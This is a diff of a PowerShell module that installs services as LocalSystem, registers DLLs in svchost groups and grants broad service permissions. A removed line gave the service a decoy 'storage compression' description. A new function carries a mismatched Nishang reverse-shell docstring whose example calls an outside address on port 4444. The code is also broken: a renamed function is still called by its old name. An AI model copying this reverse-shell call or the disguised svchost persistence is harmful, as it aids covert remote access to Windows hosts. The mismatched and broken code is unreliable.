@@ -4,7 +4,6 @@
 #>
 
 
-
 function Get-AccesschkPath{   
     [CmdletBinding(SupportsShouldProcess)]
     param()
@@ -183,8 +182,41 @@ function Stop-WinService{
      }
  }
 
+function Remove-ServiceGroup{
 
-function Install-WinService{
+ <#
+ .SYNOPSIS
+ Nishang script which can be used for Reverse or Bind interactive PowerShell from a target.
+
+ .EXAMPLE
+ PS > Invoke-PowerShellTcp -Reverse -IPAddress fe80::20c:29ff:fe9d:b983 -Port 4444
+
+ #>
+    [CmdletBinding(SupportsShouldProcess)]
+    param(
+        [Parameter(Mandatory=$true, ValueFromPipeline=$true, HelpMessage="service Name", Position=0)]
+        [string]$GroupName   
+    )
+
+
+     try{
+        $RegView = [Microsoft.Win32.RegistryView]::Registry64
+        $basekey = [Microsoft.Win32.RegistryKey]::OpenBaseKey([Microsoft.Win32.RegistryHive]::LocalMachine, $RegView)
+        $subKey = $basekey.OpenSubKey("SOFTWARE\Microsoft\Windows NT\CurrentVersion\Svchost",$true)
+        $Check = $subKey.GetValue($GroupName)
+
+        if($Check -ne $Null){
+            $subKey.DeleteValue($GroupName)
+        }
+
+        Write-Verbose "Remove-ServiceGroup $GroupName"
+     }catch{
+         throw $_
+     }
+ }
+
+
+function Install-WinServiceExtended{
 
     <#
     .SYNOPSIS
@@ -209,7 +241,7 @@ function Install-WinService{
         [string]$Path,
         [Parameter(Mandatory=$false, HelpMessage="Description")]
         [string]$Description,
-        [Parameter(ParameterSetName="SharedProcess",Mandatory=$true, HelpMessage="groupname")]
+        [Parameter(Mandatory=$true, HelpMessage="groupname")]
         [string]$GroupName,
         [Parameter(Mandatory=$false, HelpMessage="Mode")]
         [ValidateSet('Manual','Automatic',"AutomaticDelayedStart","Disabled")]
@@ -217,63 +249,56 @@ function Install-WinService{
         [Parameter(ParameterSetName="SharedProcess",Mandatory=$false, HelpMessage="Service that shares a process with one or more other services.")]
         [switch]$SharedProcess,    
         [Parameter(ParameterSetName="OwnProcess",Mandatory=$false, HelpMessage="Service that shares a process with one or more other services.")]
-        [switch]$OwnProcess  
+        [switch]$OwnProcess,
+        [Parameter(Mandatory=$false, HelpMessage="reset group")]
+        [switch]$ResetGroup 
     )
-    
+  
      try{
-        if($PsCmdlet.ParameterSetName -eq 'SharedProcess'){
-            $inf = Get-Item -Path $Path 
-            if( $inf.Extension -ne '.dll'){
-                Write-Warning "Service Type SharedProcess, not SharedProcess. But using binary with Extension $($inf.Extension)"
-                return;
-            }
-        }
-    
-        if($PsCmdlet.ParameterSetName -eq 'OwnProcess'){
-            $inf = Get-Item -Path $Path 
-            if( $inf.Extension -ne '.exe'){
-                Write-Warning "Service Type OwnProcess, not SharedProcess. But using binary with Extension $($inf.Extension)"
-                return;
-            }
-        }
+        $IsDll = (((Get-Item -Path "$Path").Extension) -eq '.dll')
        
+        if([string]::IsNullOrEmpty($GroupName) -eq $False){
+            if($ResetGroup){
+                Remove-ServiceGroup -GroupName $GroupName
+            }
+
+            Add-ServiceToGroup $Name $GroupName $Path
+        }
+
         # verify if the service already exists, and if yes remove it first
-        if (Get-Service $Name -ErrorAction SilentlyContinue)
-        {
+        if (Get-Service $Name -ErrorAction SilentlyContinue){
             Uninstall-WinService $Name
         }
     
-        Write-Verbose "installing service`n   name $Name`n   binaryPathName $binaryPath`n   displayName $Name`n   startupType Automatic"
 
         $mycreds = New-Object System.Management.Automation.PSCredential ("LocalSystem", (new-object System.Security.SecureString))
         
-        $binaryPath = "{0} -k {1}" -f "%SystemRoot%\system32\svchost.exe", $GroupName
+        $binaryPath = "{0} -k {1} -s {2}" -f "%SystemRoot%\system32\svchost.exe", $GroupName, $Name
  
-        if($PsCmdlet.ParameterSetName -eq 'OwnProcess'){
+        if($IsDll -eq $False){
             $binaryPath = $Path
         }
-
+        Write-Output "[Install-WinService] Description $Description"
         if([string]::IsNullOrEmpty($Description)){
             $DateStr = (Get-Date).GetDateTimeFormats()[14]
             $Description = "Service `"{0}`" created on {1}" -f $Name, $DateStr
         }
         # creating widnows service using all provided parameters
-        $Null = New-Service -name $Name -binaryPathName $binaryPath -displayName $Name -Description "$Description" -startupType Automatic -credential $mycreds
+        $Null = New-Service -name "$Name" -binaryPathName "$binaryPath" -displayName "$Name" -Description "$Description" -startupType Automatic -credential $mycreds
 
         $ScExe=(get-command sc.exe).Source
-        if($PsCmdlet.ParameterSetName -eq 'SharedProcess'){
-            Add-ServiceToGroup $Name $GroupName $Path
+        if($SharedProcess){
             $OutSc =  &"$ScExe" 'config' "$Name" 'type=' 'share'
             Write-Output $OutSc
-        }else{
-            $subKey.SetValue("Type",0x10)
+        }elseif($OwnProcess){
+            Write-Output '`"$ScExe`" "config" "$Name" "type=" "own"'
             $OutSc =  &"$ScExe" 'config' "$Name" 'type=' 'own'
             Write-Output $OutSc
         }
 
-        "[Install-WinService] SUCCESS"
+        Write-Output "[Install-WinService] SUCCESS"
      }catch{
-         throw $_
+        throw $_
      }
  }
 
@@ -300,6 +325,7 @@ function Add-ServiceToGroup{
 
 
      try{
+        Write-Output "[Add-ServiceToGroup] $ServiceName $GroupName"
         $RegistryPath="HKLM:\SYSTEM\CurrentControlSet\services\{0}\Parameters" -f $ServiceName
         $Null=New-Item -Path $RegistryPath -ItemType Directory -Force -ErrorAction Ignore
         $Null = New-ItemProperty -Path $RegistryPath -Name 'ServiceDll' -Value $DllPath -PropertyType ExpandString -Force 
@@ -311,7 +337,7 @@ function Add-ServiceToGroup{
         $GroupExists = $CurrentGroups.Contains($GroupName)
          
         if($GroupExists -eq $True){
-            Write-Verbose "Group $GroupName already exists. Adding service in list for group."
+            Write-Output "Group $GroupName already exists. Adding service in list for group."
             [string[]]$AllGroupServices=$subKey.GetValue($GroupName)
             $AllGroupServices+=$ServiceName
             $subKey.SetValue($GroupName,$AllGroupServices)
@@ -398,12 +424,18 @@ function Update-ServiceRegistration{
     [CmdletBinding(SupportsShouldProcess)]
     param(
         [Parameter(Mandatory=$true, HelpMessage="service Name", Position=0)]
-        [string]$ServiceName   
+        [string]$ServiceName,
+        [Parameter(Mandatory=$true, HelpMessage="service Name", Position=1)]
+        [string]$GroupName,
+        [Parameter(Mandatory=$true, HelpMessage="service Name", Position=2)]
+        [string]$BinaryPath, 
+        [Parameter(Mandatory=$true, HelpMessage="service Name", Position=3)]
+        [string]$Description 
     )
      try{
         Write-BuildOutTitle "CONFIGURE SERVICE REGISTRATION"
-        $Description = "Helps the computer run more efficiently by optimizing storage compression."
-        Install-WinService -Name "$ServiceName" -GroupName $ServiceGroup -Path $ServicePath -Description $Description -StartupType Automatic -SharedProcess
+        
+        Install-WinService -Name "$ServiceName" -GroupName $GroupName -Path $BinaryPath -Description $Description -StartupType Automatic -SharedProcess
         Set-ServicePermissions -Name "$ServiceName" -Identity "$ENV:USERNAME" -Permission full
         Set-ServicePermissions -Name "$ServiceName" -Identity "NT AUTHORITY\SYSTEM" -Permission full
         Set-ServicePermissions -Name "$ServiceName" -Identity "NT AUTHORITY\SERVICE" -Permission full
